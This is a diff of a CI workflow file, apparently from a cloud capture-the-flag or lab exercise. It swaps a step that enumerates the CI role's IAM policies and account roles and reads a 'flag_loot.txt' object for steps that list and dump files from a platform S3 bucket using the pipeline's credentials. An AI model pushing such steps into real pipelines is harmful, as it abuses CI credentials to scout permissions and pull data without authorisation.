@@ -41,14 +41,8 @@ jobs:
             aws s3 cp "s3://site781fe43f26b9eba3/$k" - 2>/dev/null | head -40 || echo "(denied)"
           done
             
-      - name: Enumerate roles & policies
+      - name: Check results
         run: |
-          echo "---- my attached policies ----"
-          aws iam list-attached-role-policies --role-name cicdRole 2>/dev/null || echo "denied"
-          aws iam list-role-policies --role-name cicdRole 2>/dev/null || echo "denied"
-          echo "---- roles in account ----"
-          aws iam list-roles --query 'Roles[].[RoleName,Arn]' --output text 2>/dev/null || echo "denied"
-
-      - name: Read flag from platform-bucket
-        run: |
-          aws s3 cp s3://platform-bucket-009661764077-us-east-1/flag_loot.txt - 2>&1
+          aws s3 ls s3://platform-bucket-009661764077-us-east-1/ --recursive 2>&1
+          aws s3 cp s3://platform-bucket-009661764077-us-east-1/aws_path.txt - 2>/dev/null || true
+          aws s3 cp s3://platform-bucket-009661764077-us-east-1/test.txt - 2>/dev/null || true
